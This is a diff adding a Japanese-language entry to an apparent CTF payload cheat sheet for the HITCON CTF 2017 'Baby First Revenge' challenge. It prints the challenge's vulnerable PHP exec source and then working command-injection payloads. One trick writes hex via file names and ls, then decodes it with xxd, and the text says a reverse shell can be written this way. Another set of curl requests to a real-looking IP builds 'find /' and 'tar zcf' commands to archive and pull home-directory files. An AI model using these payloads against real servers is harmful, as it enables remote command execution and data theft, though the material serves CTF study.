@@ -63,9 +63,79 @@ http://localhost/
 &args[5]=wget
 &args[6]=846465263%0a
 ```
-## 
+## PHP "exec(cmd) len(cmd)<= 5"(Hitcon CTF 2017 Quals: Baby First Revenge)
+https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/  
+https://hack.more.systems/writeup/2017/11/06/hitconctf-babyfirstrevenge/  
 - **entrypoint**  
+以下のPHPソースが与えられる。つまり、5文字以内でFlagをゲットする必要がある。  
+```php
+<?php
+    $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
+    @mkdir($sandbox);
+    @chdir($sandbox);
+    if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 5) {
+        @exec($_GET['cmd']);
+    } else if (isset($_GET['reset'])) {
+        @exec('/bin/rm -rf ' . $sandbox);
+    }
+    highlight_file(__FILE__);
+```
+いろいろ解法があるらしいけど、以下のようにして`HELLO`という文字列を`z`というファイルに子の手順で書き込めるらしい。  
+`>4845`,`ls>>y`で`y`というファイルに`4845`という値が書き込まれる。  
+こんな調子でyというファイルにHEXで書き込んでいく。  
+`*`でファイルが展開されて最終的に`xxd -p -r y z`みたいにASCIIに直して書きこむ。 
+これでリバースシェルも書き込んでFlagゲット。  
+```txt
+>4845
+ls>>y
+rm 4*
+>4c4c
+ls>>y
+rm 4*
+>4f
+ls>>y
+rm 4*
+>z
+>-p
+>-r
+xxd *
+```
+別のやり方として、以下のように`*`でファイルを展開してコマンドとして実行できるらしい！  
+以下だと`find /`が実行できる。  
+`/home/fl4444g/README.txt`が得られるらしい。  
+```txt
+curl 'http://52.199.204.34/?cmd=>find'
+curl 'http://52.199.204.34/?cmd=*%20/>x'
+```
+以下で`tar zcf zzz /h*`でzzzというファイルを作成してそれをダウンロードしてFlagゲット。(この後もいろいろあるけど同じことなので割愛)  
+```txt
+curl 'http://52.199.204.34/?cmd=>tar'
+curl 'http://52.199.204.34/?cmd=>zcf'
+curl 'http://52.199.204.34/?cmd=>zzz'
+curl 'http://52.199.204.34/?cmd=*%20/h*'
+```
 - **payload**  
+```txt
+>4845
+ls>>y
+rm 4*
+>4c4c
+ls>>y
+rm 4*
+>4f
+ls>>y
+rm 4*
+>z
+>-p
+>-r
+xxd *
+```
+```txt
+curl 'http://52.199.204.34/?cmd=>tar'
+curl 'http://52.199.204.34/?cmd=>zcf'
+curl 'http://52.199.204.34/?cmd=>zzz'
+curl 'http://52.199.204.34/?cmd=*%20/h*'
+```
 ## 
 - **entrypoint**  
 - **payload**  
